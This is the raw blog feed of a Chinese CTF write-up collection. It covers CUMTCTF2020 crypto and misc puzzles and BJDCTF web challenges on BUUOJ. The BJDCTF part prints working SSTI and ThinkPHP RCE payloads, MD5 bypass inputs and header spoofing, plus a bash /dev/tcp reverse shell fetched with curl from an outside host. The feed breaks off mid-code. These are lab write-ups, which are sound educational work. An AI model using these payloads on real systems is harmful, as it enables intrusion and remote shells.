class="line"><span class="comment"># b = str(bytes.fromhex(hex(a)[2:]))</span></span><br><span class="line"><span class="comment"># print(b)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># a = 6071069041322015914824844158128867915719328949545468665089325844368923468715106</span></span><br><span class="line"><span class="comment"># b = str(bytes.fromhex(hex(a)[2:]))</span></span><br><span class="line"><span class="comment"># print(b)</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">6289936645427058418849789859504444219159397</span></span><br><span class="line">b = <span class="built_in">str</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(a)[<span class="number">2</span>:]))</span><br><span class="line">print(b)</span><br><span class="line"><span class="comment">#H4ve_fun_with_base</span></span><br><span class="line"><span class="comment">#CUMTCTF&#123;H4ve_fun_with_base&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=gbk</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">nx,x1,x</span>):</span></span><br><span class="line">    <span class="comment">#n为待转换的十进制数，x为机制，取值为2-62</span></span><br><span class="line">    a=[<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>]</span><br><span class="line">    nx=<span class="built_in">str</span>(nx)</span><br><span class="line">    b1=<span class="built_in">list</span>(nx)</span><br><span class="line">    <span class="built_in">print</span> (nx,<span class="string">&quot;[&quot;</span>,x1,<span class="string">&quot;]==[&quot;</span>,x,<span class="string">&quot;] &quot;</span>,end=<span class="string">&#x27;&#x27;</span>) </span><br><span class="line">    b2=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> b1:</span><br><span class="line">        <span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">62</span>):</span><br><span class="line">            <span class="keyword">if</span> a[i1]==i:</span><br><span class="line">                b2=b2+[i1]</span><br><span class="line">                <span class="keyword">if</span> i1&gt;x1:</span><br><span class="line">                    <span class="built_in">print</span> (i,<span class="string">&quot;错误定义&quot;</span>)</span><br><span class="line">    b2.reverse()</span><br><span class="line">    <span class="comment">#print(b2)</span></span><br><span class="line">    n1=<span class="number">0</span></span><br><span class="line">    n2=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> b2:</span><br><span class="line">        n1=n1+<span class="built_in">int</span>(i)*(<span class="built_in">pow</span>(x1,n2-<span class="number">1</span>))  <span class="comment">#pow(x, n)，即计算 x 的 n 次幂函数</span></span><br><span class="line">        n2=n2+<span class="number">1</span></span><br><span class="line">        <span class="comment">#print (n1,n2)</span></span><br><span class="line">    n=n1</span><br><span class="line">    <span class="comment">#print(n)</span></span><br><span class="line">    b=[]</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s=n//x<span class="comment">#商</span></span><br><span class="line">        y=n%x<span class="comment">#余数</span></span><br><span class="line">        b=b+[y]</span><br><span class="line">        <span class="keyword">if</span> s==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        n=s</span><br><span class="line">    b.reverse()  <span class="comment">#reverse() 函数用于反向列表中元素,由个，十百转为百十个</span></span><br><span class="line">    bd=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">        <span class="comment">#print(a[i],end=&#x27;&#x27;)</span></span><br><span class="line">        bd=bd+a[i]</span><br><span class="line">    <span class="built_in">print</span> (bd)</span><br><span class="line">    <span class="keyword">return</span> bd</span><br><span class="line"></span><br><span class="line"><span class="comment"># chun=&#x27;zF4mOFpN7A&#x27;</span></span><br><span class="line"><span class="comment"># print (chun)</span></span><br><span class="line"><span class="comment"># print (f(chun[0:2],62,10)+f(chun[2:6],62,10)+f(chun[6:11],62,10))</span></span><br><span class="line"><span class="comment"># for i in range(0,62):</span></span><br><span class="line"><span class="comment"># f(str(i),10,62)</span></span><br><span class="line"><span class="comment">#F(str,str的进制,需要转换的进制)</span></span><br><span class="line">fl = <span class="string">&#x27;SrUs8vUbLghjqO2fI4IvUgaN&#x27;</span></span><br><span class="line"></span><br><span class="line">print(f(fl,<span class="number">61</span>,<span class="number">10</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><hr><h3 id="真签到题"><a href="#真签到题" class="headerlink" title="真签到题"></a>真签到题</h3><p>拖入010，找到base64，解码</p><hr><h3 id="兔兔那么可爱"><a href="#兔兔那么可爱" class="headerlink" title="兔兔那么可爱"></a>兔兔那么可爱</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">a=f.read()</span><br><span class="line"><span class="built_in">list</span>(a)</span><br><span class="line">l = <span class="built_in">len</span>(a)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">n</span>):</span></span><br><span class="line">    one=<span class="number">0</span></span><br><span class="line">    two=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n&gt;<span class="number">0</span>:</span><br><span class="line">        one,two=two,one+two</span><br><span class="line">        n-=<span class="number">1</span></span><br><span class="line">        <span class="keyword">yield</span> two</span><br><span class="line"></span><br><span class="line">key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> fib(<span class="number">100</span>):</span><br><span class="line">key.append(i)</span><br><span class="line">print(key)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line"><span class="keyword">if</span>(i &lt;= l):</span><br><span class="line">flag += a[i-<span class="number">1</span>]</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#CUMTCTF&#123;Are_rabbits_cute?&#125;</span></span><br></pre></td></tr></table></figure><hr><h3 id="大鲨鱼之你可劲找"><a href="#大鲨鱼之你可劲找" class="headerlink" title="大鲨鱼之你可劲找"></a>大鲨鱼之你可劲找</h3><p>打开追踪http流，发现为sql注入流量包，用脚本将sql语句和response导入文件发现为二分查找，每次以79开始，找每一个79之前的流量包，手工收集并转码，最后得到带分隔符的数字flag</p><hr><h3 id="别做题了听歌吧"><a href="#别做题了听歌吧" class="headerlink" title="别做题了听歌吧"></a>别做题了听歌吧</h3><p>先用audacity打开什么没有发现，尝试mp3stego，猜测密码为cumt，分离出带tab和和空格的txt，猜测为摩斯密码，写脚本tab转- 空格转. 换行转/解码得到flag</p><hr><h3 id="连签到都算不上"><a href="#连签到都算不上" class="headerlink" title="连签到都算不上"></a>连签到都算不上</h3><p>base64解码之后扫码，然后unicode解码，然后社会主义核心价值观解码</p><hr><h3 id="残缺的大鲨鱼"><a href="#残缺的大鲨鱼" class="headerlink" title="残缺的大鲨鱼"></a>残缺的大鲨鱼</h3><p>追踪TCP流可以发现某个TCP流中有传输的文件<code>flag.zip</code>，选择显示和保存数据为原始数据保存流量，在<code>winhex</code>中把开头的<code>http</code>头部去掉，然后解压可以得到文件<code>flag</code></p><p>根据hint可以发现flag文件是个反过来的jpg文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> r:</span><br><span class="line">    content = r.read()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./res.jpg&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> w:</span><br><span class="line">        w.write(content[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>在winhex中可以发现文件末尾有zip文件的结尾，但是没有开始，不过可以发现hex值<code>03 04 14 00</code>，修改一下前两个字节然后保存到新文件，解压即可得到bbxxss.txt，其中的codeemoji上次考过，code emoji解码即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">👾🐝🐁🐙👾🐙😸🚚🎂🏪💑🌋🍴🍖💪🎢🍖🍭🚄🏯🏯🚒😴🚣</span><br><span class="line">You know what I mean?</span><br></pre></td></tr></table></figure><p>官方题解：<a href="http://ueverglow.top/wp-content/uploads/2020/09/CUMTCTF2020%E5%AE%98%E6%96%B9%E9%A2%98%E8%A7%A3.pdf">CUMTCTF2020官方题解</a></p>]]></content>
    
    
    <summary type="html">CUMTCTF2020校赛题解</summary>
    
    
    
    <category term="CTF" scheme="https://r4in1.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>记BJDCTF on BUUOJ</title>
    <link href="https://r4in1.github.io/2020/12/02/%E8%AE%B0BJDCTF-on-BUUOJ/"/>
    <id>https://r4in1.github.io/2020/12/02/%E8%AE%B0BJDCTF-on-BUUOJ/</id>
    <published>2020-12-02T12:37:25.000Z</published>
    <updated>2020-12-02T12:42:37.349Z</updated>
    
    <content type="html"><![CDATA[<p>干啥啥不行，签到第一名</p><h3 id="BJDCTF-2nd-签到-y1ng"><a href="#BJDCTF-2nd-签到-y1ng" class="headerlink" title="[BJDCTF 2nd]签到-y1ng"></a>[BJDCTF 2nd]签到-y1ng</h3><p>crypto签到，直接base64解码</p><h3 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h3><p>ssti<br>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qaq?name&#x3D;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[117].__init__.__globals__[&#39;popen&#39;](&#39;cat ..&#x2F;flag&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>参考：<br><a href="https://xz.aliyun.com/t/6885">https://xz.aliyun.com/t/6885</a><br><a href="https://xz.aliyun.com/t/3679">https://xz.aliyun.com/t/3679</a><br><a href="https://www.cnblogs.com/keithtt/p/7709445.html">https://www.cnblogs.com/keithtt/p/7709445.html</a></p><h3 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h3><ul><li>考点：thinkPHPv5.0.23 RCE</li></ul><p>打开靶机是一个黑页，然后给了提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Powered By THINKPHP5</span><br></pre></td></tr></table></figure><p>RCE（remote code execution）<br>THINKPHP5远程代码执行漏洞：<br><a href="">https://www.cnblogs.com/bmjoker/p/10110868.html</a><br><a href="">https://www.freebuf.com/vuls/191847.html</a></p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index.php&#x2F;?s&#x3D;captcha</span><br><span class="line"></span><br><span class="line">post_data:</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure><h3 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h3><p>提交111，用burpsuite拦截可以看到response的header中有hint：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint: select * from &#39;admin&#39; where password&#x3D;md5($pass,true)</span><br></pre></td></tr></table></figure><p>貌似是以赛抗“疫”里也有这个考点，php中<code>md5()</code>函数的第二个参数如果是<code>true</code>的话，md5之后可返回的字符串中能会出现单引号，payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop | 276f722736c95d99e921722cf9ed621c | b&quot;&#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c&quot;</span><br></pre></td></tr></table></figure><p>然后mysql中，以非‘0’字符开头的字符串转为bool值时，会转为true</p><p>这里有个疑问，这一题的源码是直接用<code>if($password==&#39;ffifdyop&#39;)</code>来判断的结果，而不是连接数据库，那么如果用含有<code>&#39;=&#39;</code>的md5值其实也可以绕过判断，利用<code>select &#39;a&#39;=&#39;b&#39;=&#39;c&#39;</code>返回true的特性来绕过（这是上次安恒的群里发的比赛的考点）</p><p>可参考下面这篇文章的评论区<br><a href="http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/">http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/</a></p><p>然后转到页面<code>DO YOU LIKE MD5</code>，页面中有注释：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; md5(<span class="variable">$a</span>) == md5(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="comment">// wow, glzjin wants a girl friend.</span></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>要求参数不相但md5值相等，用的弱比较<code>==</code>和<code>!=</code>，可以用<code>0e</code>开头的字符串绕过，php中的<code>md5()</code>和<code>sha1()</code>之类的函数在传入参数为数组时，会直接返回<code>false</code>，所以也可以直接传入两个数组作为参数来绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?a&#x3D;QNKCDZO&amp;b&#x3D;s878926199a</span><br></pre></td></tr></table></figure><p>然后下一步要求：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;md5(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===md5(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用post方式传递两个数组作为参数，payload：</p><p>post_data<br>param1[]=1¶m2[]=2</p><h3 id="BJDCTF-2nd-假猪套天下第一"><a href="#BJDCTF-2nd-假猪套天下第一" class="headerlink" title="[BJDCTF 2nd]假猪套天下第一"></a>[BJDCTF 2nd]假猪套天下第一</h3><p>打开之后是个登录界面，随便输了个密码就可以登录，但是登陆之后什么都没有只有一个欢迎界面，burpsuite截包，可以看到个302页面中有个注释<code>L0g1n.php</code></p><p>访问L0g1n.php，回显</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sorry, this site will be available after totally 99 years!</span><br></pre></td></tr></table></figure><p>看到发送的请求中的<code>cookie</code>存在<code>time=xxxxx</code>，修改该属性的值，在后面多加几个9，回显</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sorry, this site is only optimized for those who comes from localhost</span><br></pre></td></tr></table></figure><p>后面就全部是修改<code>header</code>的问题了，参考相关链接</p><p><a href='https://www.cnblogs.com/jxl1996/p/10245958.html' target='_blank' rel="noopener noreferrer">http header </a></p><p>据出题人的题解，比较坑的是，当修改<code>X-Forwarded-For</code>为127.0.0.1时回显：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Do u think that I dont know X-Forwarded-For?</span><br><span class="line">Too young too simple sometimes naive</span><br></pre></td></tr></table></figure><p>可以用<code>Client-IP</code>或者<code>X-Real-ip</code>代替<code>XFF</code><br>还有个比较坑的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sorry, this site is only optimized for browsers that run on Commodo 64</span><br></pre></td></tr></table></figure><p>出题人说可以搜到Commodo 64暗示的是一个操作系统，可以搜到Commodore 64（虽然我并没有搜到，没梯子），修改UA为<code>Commodore 64</code>，其他需要修改的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Client-IP: 127.0.0.1      &#x2F;&#x2F;客户端ip</span><br><span class="line">From: root@gem-love.com   &#x2F;&#x2F;email</span><br><span class="line">VIA: y1ng.vip             &#x2F;&#x2F;http proxy</span><br><span class="line">Referer: gem-love.com     &#x2F;&#x2F;来源</span><br></pre></td></tr></table></figure><p>最终的页面备注里有base64编码的flag</p><h3 id="BJDCTF-2nd-duangShell"><a href="#BJDCTF-2nd-duangShell" class="headerlink" title="[BJDCTF 2nd]duangShell"></a>[BJDCTF 2nd]duangShell</h3><p>打开靶机之后回显</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">珍爱网</span><br><span class="line">how can i give you source code? .swp?!</span><br><span class="line">where is P3rh4ps&#39;s girl friend ???</span><br></pre></td></tr></table></figure><p><code>.swp</code>文件是非正常关闭vi/vim时产生的文件，可以用方便vim恢复原来的工作（类似临时文件？），可以用<code>vim -r filename</code>恢复编辑文件的内容</p><p>访问<code>/.index.php.swp</code>，使用vim恢复源代码，然后<code>:11,26 w ./index,php</code>将代码部分保存到新的index.php中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;how can i give you source code? .swp?!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;girl_friend&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;where is P3rh4ps&#x27;s girl friend ???&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$girl</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;girl_friend&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/\&gt;|\\\/&#x27;</span>, <span class="variable">$girl</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;just girl&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i&#x27;</span>, <span class="variable">$girl</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;img/p3_need_beautiful_gf.png&#x27;&gt; &lt;!-- He is p3 --&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//duangShell~~~~</span></span><br><span class="line">        exec(<span class="variable">$girl</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>exec()</code>函数与<code>system()</code>不一样，是没有运行结果回显的，所以这一题要用到反弹shell，不过我一直没搞明白buuoj上的靶机怎么用，所以这一题还没搞出来，大致思路：</p><p>先在服务器上创建个文件<code>shell.txt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[ip1]&#x2F;[port1] 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>然后在ip1服务器上用nc监听port1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp [port1]</span><br></pre></td></tr></table></figure><p>然后放payload，访问靶机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post_data: girl_friend&#x3D;curl ip1&#x2F;shell.txt</span><br></pre></td></tr></table></figure><p>然后在服务器ip1上可以收到反弹的shell</p><p><a href='https://www.jianshu.com/p/6aca9b29514d' target='_blank' rel="noopener noreferrer">Linux下反弹shell几种方法学习总结</a></p><h3 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h3><p>dirsearch扫描可以发现有<code>/.git/</code>目录，使用<code>GitHack</code>可以把代码down下来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#dirsearch</span><br><span class="line">python dirsearch.py -u http:&#x2F;&#x2F;xxx -e php</span><br><span class="line"></span><br><span class="line">#GitHach</span><br><span class="line">python2 GitHack.py http:&#x2F;&#x2F;xxx&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure><p>首页中的php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span 